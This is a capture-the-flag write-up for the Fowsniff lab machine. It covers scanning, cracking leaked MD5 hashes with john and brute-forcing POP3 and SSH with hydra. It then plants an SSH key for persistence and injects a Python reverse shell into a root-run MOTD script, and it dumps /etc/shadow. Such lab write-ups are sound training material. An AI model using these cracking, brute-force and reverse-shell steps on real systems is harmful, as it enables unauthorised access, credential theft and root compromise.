# Recon

### Rustscan

```
Open 10.10.191.213:22
Open 10.10.191.213:80
Open 10.10.191.213:110
Open 10.10.191.213:143

Initiating Ping Scan at 06:38
Scanning 10.10.191.213 [2 ports]
Completed Ping Scan at 06:38, 0.10s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 06:38
Completed Parallel DNS resolution of 1 host. at 06:38, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 06:38
Scanning 10.10.191.213 [4 ports]
Discovered open port 22/tcp on 10.10.191.213
Discovered open port 143/tcp on 10.10.191.213
Discovered open port 110/tcp on 10.10.191.213
Discovered open port 80/tcp on 10.10.191.213
Completed Connect Scan at 06:38, 0.10s elapsed (4 total ports)
Nmap scan report for 10.10.191.213
Host is up, received conn-refused (0.098s latency).
Scanned at 2024-11-20 06:38:56 UTC for 0s

PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack
80/tcp  open  http    syn-ack
110/tcp open  pop3    syn-ack
143/tcp open  imap    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds

```

### Nmap

```
nmap --privileged -vvv -Pn -sC -sV -oN /opt/THM/FowsniffCTF/1-recon/nmap/nmap_init.md 10.10.191.213
```

```
Nmap scan report for 10.10.191.213
Host is up, received user-set (0.10s latency).
Scanned at 2024-11-20 01:58:43 EST for 12s
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE REASON         VERSION
22/tcp  open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCsEu5DAulaUX38ePQyI/MzevdyvWR3AXyrddVqbu9exD/jVVKZopquTfkbNwS5ZkADUvggwHnjZiLdOZO378azuUfSp5geR9WQMeKR9xJe8swjKINBtwttFgP2GrG+7IO+WWpxBSGa8akgmLDPZHs2XXd6MXY9swqfjN9+eoLX8FKYVGmf5BKfRcg4ZHW8rQZAZwiMDqQLYechzRPnePiGCav99v0X5B8ehNCCuRTQkm9DhkAcxVBlkXKq1XuFgUBF9y+mVoa0tgtiPYC3lTOBgKuwVZwFMSGoQStiw4n7Dupa6NmBrLUMKTX1oYwmN0wnYVH2oDvwB3Y4n826Iymh
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPowlRdlwndVdJLnQjxm5YLEUTZZfjfZO7TCW1AaiEjkmNQPGf1o1+iKwQJOZ6rUUJglqG8h3UwddXw75eUx5WA=
|   256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHU5PslBhG8yY6H4dpum8qgwUn6wE3Yrojnu4I5q0eTd
80/tcp  open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Fowsniff Corp - Delivering Solutions
|_http-server-header: Apache/2.4.18 (Ubuntu)
110/tcp open  pop3    syn-ack ttl 61 Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) TOP CAPA PIPELINING USER AUTH-RESP-CODE RESP-CODES UIDL
143/tcp open  imap    syn-ack ttl 61 Dovecot imapd
|_imap-capabilities: LITERAL+ more ENABLE OK post-login AUTH=PLAINA0001 capabilities IMAP4rev1 SASL-IR listed LOGIN-REFERRALS Pre-login have IDLE ID
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration

### WEB

http://10.10.191.213

![[port80.png]]

### OSINT

we see a @fowsniffcorp Twitter account. following this twitter link be are brought to the profile below

```
https://x.com/fowsniffcorp
```


![[twitter1.png]]


```
[https://pastebin.com/378rLnGi](https://t.co/qJe9lhEdpJ)
[pastebin.com/NrAqVeeX](https://t.co/RxvWMB3POM)
```

following the pastebin links we find a post regarding a data breach

```
FOWSNIFF CORP PASSWORD LEAK
            ''~``
           ( o o )
+-----.oooO--(_)--Oooo.------+
|                            |
|          FOWSNIFF          |
|            got             |
|           PWN3D!!!         |
|                            |         
|       .oooO                |         
|        (   )   Oooo.       |         
+---------\ (----(   )-------+
           \_)    ) /
                 (_/
FowSniff Corp got pwn3d by B1gN1nj4!
No one is safe from my 1337 skillz!
 
 
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
 
Fowsniff Corporation Passwords LEAKED!
FOWSNIFF CORP PASSWORD DUMP!
 
Here are their email passwords dumped from their databases.
They left their pop3 server WIDE OPEN, too!
 
MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P
 
l8r n00bz!
 
B1gN1nj4

-------------------------------------------------------------------------------------------------
This list is entirely fictional and is part of a Capture the Flag educational challenge.

--- THIS IS NOT A REAL PASSWORD LEAK ---
 
All information contained within is invented solely for this purpose and does not correspond
to any real persons or organizations.
 
Any similarities to actual people or entities is purely coincidental and occurred accidentally.

-------------------------------------------------------------------------------------------------
```

usernames and passwords are available to try and be cracked
# Exploitation

Cracking MD5 Hashes to get user passwords

```
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
```

```
john --format=raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt fowhashes.md | tee john_fowhashes.md
```

```
Using default input encoding: UTF-8
Loaded 9 password hashes with no different salts (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
scoobydoo2       (seina@fowsniff)     
orlando12        (parede@fowsniff)     
apples01         (tegel@fowsniff)     
skyler22         (baksteen@fowsniff)     
mailcall         (mauer@fowsniff)     
07011972         (sciana@fowsniff)     
carp4ever        (mursten@fowsniff)     
bilbo101         (mustikka@fowsniff)     
8g 0:00:00:00 DONE (2024-11-20 02:30) 14.28g/s 25613Kp/s 25613Kc/s 65506KC/s  fuckyooh21..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```


all hashes successfully cracked, we  will try logging into the pop3 service on the machine using the combination of users and passwords

```
john --show --format=raw-MD5 fowhashes.md
```

```
mauer@fowsniff:mailcall
mustikka@fowsniff:bilbo101
tegel@fowsniff:apples01
baksteen@fowsniff:skyler22
seina@fowsniff:scoobydoo2
mursten@fowsniff:carp4ever
parede@fowsniff:orlando12
sciana@fowsniff:07011972

8 password hashes cracked, 1 left

```


brute focing POP3 mail service using the newly found users and passwords


```
hydra -L users.md -P passes.md -f 10.10.191.213 pop3
```

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-20 02:37:01
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 64 login tries (l:8/p:8), ~4 tries per task
[DATA] attacking pop3://10.10.191.213:110/
[110][pop3] host: 10.10.191.213   login: seina   password: scoobydoo2
[STATUS] attack finished for 10.10.191.213 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-20 02:37:43
```


```
seina
scoobydoo2
```

connecting to the POP3 service using telnet


```
telnet 10.10.191.213 110
USER seina
PASS scoobydoo2
list
retr 1
retr 2
```

listing messages, we see that there are 2 available messages


```
Trying 10.10.191.213...
Connected to 10.10.191.213.
Escape character is '^]'.
+OK Welcome to the Fowsniff Corporate Mail Server!
USER seina
+OK
PASS scoobydoo2
+OK Logged in.
list
+OK 2 messages:
1 1622
2 1280
.
```

the first message


```
Return-Path: <stone@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
	id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone
```

the second message


```
Return-Path: <baksteen@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1004)
	id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
To: seina@fowsniff
Subject: You missed out!
Message-Id: <20180313185405.101CA1AC2@fowsniff>
Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
From: baksteen@fowsniff

Devin,

You should have seen the brass lay into AJ today!
We are going to be talking about this one for a looooong time hahaha.
Who knew the regional manager had been in the navy? She was swearing like a sailor!

I don't know what kind of pneumonia or something you brought back with
you from your camping trip, but I think I'm coming down with it myself.
How long have you been gone - a week?
Next time you're going to get sick and miss the managerial blowout of the century,
at least keep it to yourself!

I'm going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.

Feel better,

Skyler

PS: Make sure you change your email password. 
AJ had been telling us to do that right before Captain Profanity showed up.
```

the newly found password

```
S1ck3nBluff+secureshell
```

# Persistence

establishing persistence by adding an authorized ssh key for baksteen

```
/home/baksteen/.ssh/authorized_keys
```

# Privilege Escalation

### User

using the new password and previous list of users to brute force the ssh service

```
hydra -L users.md -p S1ck3nBluff+secureshell -f 10.10.191.213 ssh
```

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-20 02:49:08
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:8/p:1), ~1 try per task
[DATA] attacking ssh://10.10.191.213:22/
[22][ssh] host: 10.10.191.213   login: baksteen   password: S1ck3nBluff+secureshell
[STATUS] attack finished for 10.10.191.213 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-20 02:49:10
```

we can now connect to the ssh service using the following

```
ssh baksteen@10.10.191.213
S1ck3nBluff+secureshell
```

### Root

interesting file found through linpeas.sh

```
╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
  Group users:
/opt/cube/cube.sh
```

```
/opt/cube/cube.sh
```

```
cat cube.sh
``` 

```
printf "
                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions\n\n"
```

turns out this file is executed when a user logs into the ssh service

```
/etc/update-motd.d/00-header
```

```
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

#[ -r /etc/lsb-release ] && . /etc/lsb-release

#if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
#	# Fall back to using the very slow lsb_release utility
#	DISTRIB_DESCRIPTION=$(lsb_release -s -d)
#fi

#printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"

sh /opt/cube/cube.sh
```

creating a reverse shell

https://www.revshells.com/

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.18.190",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

edit cube.sh and insert the reverse shell bash code

start a listener on the attacker machine

```
nc -lvnp 1337
```

in a different terminal on the attacker machine, log into the ssh service


```
ssh -i baksteen_rsa_persis baksteen@10.10.191.213
```


observer the reverse shell listener picked something up, it is a shell that runs as the root user

```
listening on [any] 1337 ...
connect to [10.6.18.190] from (UNKNOWN) [10.10.191.213] 47866
# whoami
whoami
root
# sudo -l
sudo -l
Matching Defaults entries for root on fowsniff:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User root may run the following commands on fowsniff:
    (ALL : ALL) ALL
# uname -a
uname -a
Linux fowsniff 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
# 

```

we are now able to view /etc/shadow and the root flag

/etc/shadow

```
root:!:17599:0:99999:7:::
daemon:*:17599:0:99999:7:::
bin:*:17599:0:99999:7:::
sys:*:17599:0:99999:7:::
sync:*:17599:0:99999:7:::
games:*:17599:0:99999:7:::
man:*:17599:0:99999:7:::
lp:*:17599:0:99999:7:::
mail:*:17599:0:99999:7:::
news:*:17599:0:99999:7:::
uucp:*:17599:0:99999:7:::
proxy:*:17599:0:99999:7:::
www-data:*:17599:0:99999:7:::
backup:*:17599:0:99999:7:::
list:*:17599:0:99999:7:::
irc:*:17599:0:99999:7:::
gnats:*:17599:0:99999:7:::
nobody:*:17599:0:99999:7:::
systemd-timesync:*:17599:0:99999:7:::
systemd-network:*:17599:0:99999:7:::
systemd-resolve:*:17599:0:99999:7:::
systemd-bus-proxy:*:17599:0:99999:7:::
syslog:*:17599:0:99999:7:::
_apt:*:17599:0:99999:7:::
messagebus:*:17599:0:99999:7:::
uuidd:*:17599:0:99999:7:::
postfix:*:17599:0:99999:7:::
dovecot:*:17599:0:99999:7:::
dovenull:*:17599:0:99999:7:::
sshd:*:17599:0:99999:7:::
stone:$6$ZqwLmndIR6qU/tlM$7XJ3dgO8oZEn1E660b.wCzIMgckjuiGfZookllpHR0hF4gwvZKMx1EFdop7EEYQKb/vp2nDCHWtiI/AKsOipf0:17599:0:99999:7:::
parede:$6$4NrmVKhIshBwUKlP$.IWJgjBi3632kwarmPY/8471zjGtzwG6/c3y6nVAnucrO0Q16zgzi3AKhqNtB/ibjrumKZQeGfGyAlYyAt52z/:17599:0:99999:7:::
mauer:$6$KLSaMNK.HGvomEm.$SZDQMudWshlWVkmdjTzaJCC7RWGhDWB6hCerqFNa8V/CEFlz.nqHsjJsVOTxH82uXH3WLnHynxg/.RsQZX5Ff.:17599:0:99999:7:::
sciana:$6$e55ofVQ6bRmCJlSD$oIkxRih2ZtgAlcsWQQegBprvd0cZzAviF4bBDpVP1JtOG4z.dxCED8gDdhx4P19JyzjI3WviR/IG.aj/M82o10:17599:0:99999:7:::
baksteen:$6$bIo9CngbzkgWaPH1$EVbxyUTrMjMVL85998hxMafLyXqvbNqSnFUx2a.B.GcyV4f0GBsEfUYjxciSZaKI5KPgH0ayY9VhbGHl1rbye1:17599:0:99999:7:::
mursten:$6$oc9lFfcr/NXCLJih$4IAE/SCPjGL1dYdxIFp0Pu21L0UGfRYyXXy500zbNNxmWZ.I8IAMOvr0sZt7iasxMMlq0nohjy4oCtP51B4k8/:17599:0:99999:7:::
tegel:$6$GI4IXaSf3SFiJ7H6$1KSGYui7ZRR.IIW0.nUin9m3Umh/qeOELfiphxMn.bpky5Docmjs2UEg9h2GaqpNdr0uizMaDNhy/A7NnjmHY/:17599:0:99999:7:::
seina:$6$.RXMM6MCm5BsTW8h$eoh0UgmvH.Bri51YLo7q4a273Mrjn.tHhKocHJTDcZtRhhv.ULzZpUbWGnM5E5ELPFhRex00rZ.MqCG1XSL6c.:17599:0:99999:7:::
mustikka:$6$b8arGcXk5Efqw/IX$YEyI.Cch1N3QBQtriJ86qXWaP36XSed7ujgM.cEPdwqZaRjXGmsaleey42XK0wRB2WcQqXBAOIOVK3yCyWNXN.:17599:0:99999:7:::
```

flag.txt
```
   ___                        _        _      _   _             _ 
  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
 | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
               |___/ 

 (_)
  |--------------
  |&&&&&&&&&&&&&&|
  |    R O O T   |
  |    F L A G   |
  |&&&&&&&&&&&&&&|
  |--------------
  |
  |
  |
  |
  |
  |
 ---

Nice work!

This CTF was built with love in every byte by @berzerk0 on Twitter.

Special thanks to psf, @nbulischeck and the whole Fofao Team.
```
